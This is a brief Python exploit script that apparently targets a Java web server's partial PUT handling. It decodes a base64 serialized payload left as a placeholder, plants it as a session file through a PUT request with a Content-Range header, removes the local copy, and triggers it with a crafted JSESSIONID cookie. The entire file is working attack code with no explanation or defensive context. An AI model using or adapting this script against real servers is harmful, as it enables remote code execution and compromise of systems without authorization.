import requests
import base64
import os

TARGET_IP = "http://<website>:8081/"

b64_encoded_payload = '''Add the payload'''

output_file_path = "payload_decoded.bin"
decoded_content = base64.b64decode(b64_encoded_payload)

with open(output_file_path, "wb") as f:
    f.write(decoded_content)

put_url = f"{TARGET_IP}defhawk.session" 
put_headers = {"Content-Range": "bytes 0-5/100"}

with open(output_file_path, "rb") as f:
    put_response = requests.put(put_url, data=f, headers=put_headers)
print(f"[+] PUT Response: {put_response.status_code}") 

os.remove(output_file_path)

get_url = f"{TARGET_IP}"
get_headers = {"Cookie": "JSESSIONID=.defhawk"}
get_response = requests.get(get_url, headers=get_headers)
print(f"[+] GET Response: {get_response.status_code}")  